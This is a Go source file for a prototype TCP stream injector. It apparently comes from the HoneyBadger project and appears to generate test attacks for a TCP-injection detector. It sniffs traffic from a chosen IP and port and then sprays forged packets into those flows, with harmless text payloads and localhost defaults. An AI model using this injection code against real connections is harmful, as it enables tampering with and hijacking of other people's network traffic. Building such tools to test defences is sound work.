/*
 *    rough but working prototype; probabalistic ordered coalesce TCP stream injector!
 *
 *    Copyright (C) 2014, 2015  David Stainton
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package main


import (
	"flag"
	"fmt"
	"github.com/david415/HoneyBadger/attack"
	"github.com/david415/HoneyBadger/types"
	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
)


var iface = flag.String("i", "lo", "Interface to get packets from")
var filter = flag.String("f", "tcp", "BPF filter for pcap")
var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
var servicePort = flag.Int("e", 9666, "target TCP flows from this port")
var coalesce1or2 = flag.Bool("coalesce1", true, "perform the TCP coalesce1 injection, perform coalesce2 if false.")

func main() {
	defer util.Run()()

	var eth layers.Ethernet
	var dot1q layers.Dot1Q
	var ip4 layers.IPv4
	var ip6 layers.IPv6
	var ip6extensions layers.IPv6ExtensionSkipper
	var tcp layers.TCP
	var payload gopacket.Payload

	decoded := make([]gopacket.LayerType, 0, 4)

	// target/track all TCP flows from this TCP/IP service endpoint
	trackedFlows := make(map[types.TcpIpFlow]int)
	serviceIP := net.ParseIP(*serviceIPstr)

	if serviceIP == nil {
		panic(fmt.Sprintf("non-ip target: %q\n", serviceIPstr))
	}

	ipv4_mode := false
	ipv6_mode := false
	if len(serviceIP) == 4 {
		ipv4_mode = true
	} else if len(serviceIP) == 16 {
		ipv6_mode = true
	} else {
		panic("wtf")
	}

	gap_payload := []byte("Many of these well-funded state/world-class adversaries are able to completely automate the compromising of computers using these TCP injection attacks against real people to violate their human rights.")
	attack_payload := []byte("Privacy is necessary for an open society in the electronic age. Privacy is not secrecy. A private matter is something one doesn't want the whole world to know, but a secret matter is something one doesn't want anybody to know. Privacy is the power to selectively reveal oneself to the world.")


	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
	if err != nil {
		log.Fatal("error opening pcap handle: ", err)
	}

	streamInjector := attack.TCPStreamInjector{}
	err = streamInjector.Init("0.0.0.0", handle, ipv6_mode)
	if err != nil {
		panic(err)
	}

	if err := handle.SetBPFFilter(*filter); err != nil {
		log.Fatal("error setting BPF filter: ", err)
	}
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
		&eth, &dot1q, &ip4, &ip6, &ip6extensions, &tcp, &payload)
	flow := &types.TcpIpFlow{}

	log.Print("collecting packets...\n")

	for {
		data, ci, err := handle.ReadPacketData()
		if err != nil {
			log.Printf("error getting packet: %v %s", err, ci)
			continue
		}
		err = parser.DecodeLayers(data, &decoded)
		if err != nil {
			log.Printf("error decoding packet: %v", err)
			continue
		}

		foundIPv6 := false
		foundIPv4 := false
		foundTcpLayer := false
		for _, typ := range decoded {
			switch typ {
			case layers.LayerTypeIPv4:
				foundIPv4 = true
			case layers.LayerTypeIPv6:
				foundIPv6 = true
			case layers.LayerTypeTCP:
				if foundIPv4 || foundIPv6 {
					foundTcpLayer = true
				}
			} // switch
		} // for

		if !foundTcpLayer {
			continue
		}
		if ipv4_mode && foundIPv6 {
			continue
		}
		if ipv6_mode && foundIPv4 {
			continue
		}

		if ipv4_mode {
			if tcp.SrcPort != layers.TCPPort(*servicePort) || !ip4.SrcIP.Equal(serviceIP.To4()) {
				continue
			}
		} else if ipv6_mode {
			if tcp.SrcPort != layers.TCPPort(*servicePort) || !ip6.SrcIP.Equal(serviceIP) {
				continue
			}
		} else {
			panic("wtf")
		}

		if foundIPv4 == true {
			flow = types.NewTcpIpFlowFromLayers(ip4, tcp)
		} else if foundIPv6 == true {
			f := types.NewTcpIpFlowFromFlows(ip6.NetworkFlow(), tcp.TransportFlow())
			flow = &f
		} else {
			panic("wtf")
		}
		_, isTracked := trackedFlows[*flow]
		if isTracked {
			trackedFlows[*flow] += 1
		} else {
			trackedFlows[*flow] = 1
		}

		// after some packets from a given flow then inject packets into the stream
		if trackedFlows[*flow] == 5 {
			if ipv4_mode {
				err = streamInjector.SetIPv4Layer(ip4)
			} else if ipv6_mode {
				streamInjector.SetLayer1(&eth, &dot1q)
				err = streamInjector.SetIPv6Layer(ip6)
			} else {
				panic("wtf")
			}
			if err != nil {
				panic(err)
			}

			streamInjector.SetTCPLayer(tcp)
			// we choose coalesce1 OR coalesce2 with a boolean
			err := streamInjector.SprayFutureAndFillGapPackets(tcp.Seq, gap_payload, attack_payload, *coalesce1or2)
			if err != nil {
				panic(err)
			}
			log.Print("packet spray sent!\n")
		}
	}
}
